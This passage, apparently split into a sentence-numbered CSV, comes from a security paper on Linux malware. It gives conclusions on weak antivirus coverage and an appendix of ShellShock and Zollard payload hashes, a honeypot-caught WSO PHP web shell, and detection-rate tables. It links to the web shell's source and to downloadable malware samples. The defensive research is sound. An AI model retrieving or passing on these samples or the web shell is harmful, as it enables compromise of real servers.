Number,Content
Sentence 140,"5.Conclusions 

Despite popular perception, Linux can be vulnerable to a variety of malware."
Sentence 141,Existing host_based defense such as antivirus software is marginal at detecting or preventing Linux malware threats.
Sentence 142,Based on organizational risk tolerance additional security controls may be required to prevent or identify Linux malware infections.
Sentence 143,Utilizing a combination of system hardening techniques and network based controls can provide an additional layer of security.
Sentence 144,Incident response capabilities may also require adjustment to detect and respond to the growing threat of Linux malware.
Sentence 145,
Sentence 146,"
7.Appendix A: Additional Payload information 

7.1.“ShellShock” 

Payload filename: “java” MD5 Hashsum: 15293d54a15e7ffe3e23c5c15d895cd7 SHA1+HashSum: 42aac86ae8627b1c9e6f681672519b73c580d132 SHA256+Hashsum: 098a02314cbf266566705b37b0ccc74eca66670f7ea75518bfc23d6843bbb478 Antivirus results:  CLAMAV: Linux.Trojan.Agent # freshclam __version ClamAV 0.98.4/20330/Wed Apr 15 13:19:08 2015 

"
Sentence 147,"
7.2.Zollard sample 
Received March 11th, 2015 9:52:52 Mountain Time."
Sentence 148,"Payload hashes:  MD5+Hashsums:+Arm: 34430c246b8740ffa208b38a0077160d  Armeabi: 8f8ddea8754181980823270da778c36b  Mips: bc7230fefef2f6ac7d7da2f33c5dfe82   Mipsel: 51e5648bee24384d46439887702b103b  Ppc: 01ad371d727a5aede23a6afd803f5abe  Sig: 7507888ab086e75af849f0970e963788  X86: 0e60bac86972e2cfc328332ce37a59af  Nodes: (Payload could not be downloaded)  SHA1+Hashsums Arm: 1713331dca6d9b798a032abae10fa2cfd54e48d3  Armeabi: 3f693ac6961db906fdb732442c90db6782921574  
None
Mips: 635f90418458dce5408c4a875b51de355cfe541f  Mipsel: a5530c5dcc91e7bf6b535ce45cc39000c92e14ae Ppc: c1984b7056bd9c828d096d7e02477b3a480963d6  Sig: af95eacc89954bb94a645de0f7f1714b7e5e3a0e  X86: b4aff97660a9cb6c3710f5e95703d2c04cc2bac7     Figure'13''CLAMAV with fully up to date signature set is unable to detect the Zollard specimens  All undetected specimens have been submitted as false negatives to the CLAMAV Project."
Sentence 149,
Sentence 150,"
7.3.PHP Web Shell  
Cache.php was uploaded to WordPress Honeypot on March 11th, 2015 at 7:12:20 AM Mountain time."
Sentence 151,"Deobfuscated using www.unphp.net Recent version of WSO is available at https://code.google.com/p/wso_web_shell_2_8/   

"
Sentence 152,"
7.4.Malware Detection Rates  
CLAMAV SOPHOS McAfee Samples Detected: 16 23 11 Percentage Detected: 32.65% 46.94% 22.45%  File MD5 Hash Sum File Name CLAM SOPHOS McAfee 9f5049a1f72b215d122d8c13c77301c8 24 1 1  6dbfc80bf15d53f368de024ce88df625 32 1 1  a1137767e888fd9ab8b8997ad6c9869c 60 1 1  3f5a5a33f4fcca7315f30b843eb9cf0f 64 1 1  a868ffa2d3fa27e83d96326efd9b3c55 200    df74b22da652138530d1a5ee4e658dc1 72464 1 1 1 1ee789f4d226bd1c37c47d7f264eb506 .nynew57.tar.gz  1  593e887daed8cdbb22e04e6c22b75855 .p 1  1 a2f420feae93d2180371ac050b524c5a 900.htm 1 1 1 34430c246b8740ffa208b38a0077160d arm  1  8f8ddea8754181980823270da778c36b armeabi  1  9b326fac414287d29156eb6060a0f4e0 cache.php 1 1  e94240600a3cb44e14d36f37debf0ff5 cata.txt    7ae21f4543fe5f842a7bb9f79d95a88e den 1 1  ce68f4076df62a1ecd10b1ee36bdac11 htrdps    98d1aab6b0e9b5e025437d0de3541ef3 i.gif    e6fd384bd9a7778364882c1a01ad2164 i2.gif    4ffd55ea9cd52950762804d8cc15a48f index.html    505acc040e76f83373f0f64b7f887ba1 index2.html    77d384ae88d205f112c48936b3f1639f inf.sh    15293d54a15e7ffe3e23c5c15d895cd7 java 1 1  e31c1cc471935fee273df0e2811bbe47 kthread    4582febf8b6533329939f7a1b35d87ce m.txt    bc7230fefef2f6ac7d7da2f33c5dfe82 mips  1  51e5648bee24384d46439887702b103b mipsel  1 1 bf6d34cc16eed1de59b94a02da9784d0 muh.zip    871eb62f62dbda3f0ba89e77af308892 mydg32.tar.gz    d41d8cd98f00b204e9800998ecf8427e news    e7d1e67d9cda78833534218062c338e5 nynew54.gif  1 1 9c415bbe3fcd2be3fa4712d759e8023d ou.pl 1 1 1 e278bf1069934064fa69ac5efa495316 p.py    01ad371d727a5aede23a6afd803f5abe ppc  1  
None
1833c07c61440cfc1cfaa074c69d757d pr.gif    5ef666696edb86953c516da80d9e95d2 psrs    00886e49d08a9bc3c3ae2fb24437d622 r2.php 1   4bc0e3c209e0686e8cc1ad46b0df6300 rio.zip 1 1 1 1ee789f4d226bd1c37c47d7f264eb506 sample.tar.gz  1 1 c15d21180b7cf946a306d2fb09efd518 sc.gif    8a1210e2f4ddf015d34d583b163b7ce8 sh    22d736bf26234260b446ce97adb54570 shms    7507888ab086e75af849f0970e963788 sig    34ec9995dd96bec233e49914524a3a0c syn    ad330959e7394ad6a4065df402832c4d test.pl 1  1 7e48b46e2a0c31216464842f731dc8e9 TSm 1 1 1 70e6882fbc41586587621f05bae8ae66 tt.tgz    c2e4f63cdae81a798bbd2780176dac32 udpa  1  0a235ab6be81c376ac5be288cd95a6a6 windosy  1  621023ab22a79f1d29c888736dd3f875 x.zip 1 1 1 0e60bac86972e2cfc328332ce37a59af x86     

"
Sentence 153,"
7.5."
Sentence 154,"Download Malware samples 
All malware samples are available for download at http://altitudeinfosec.com/presentations"
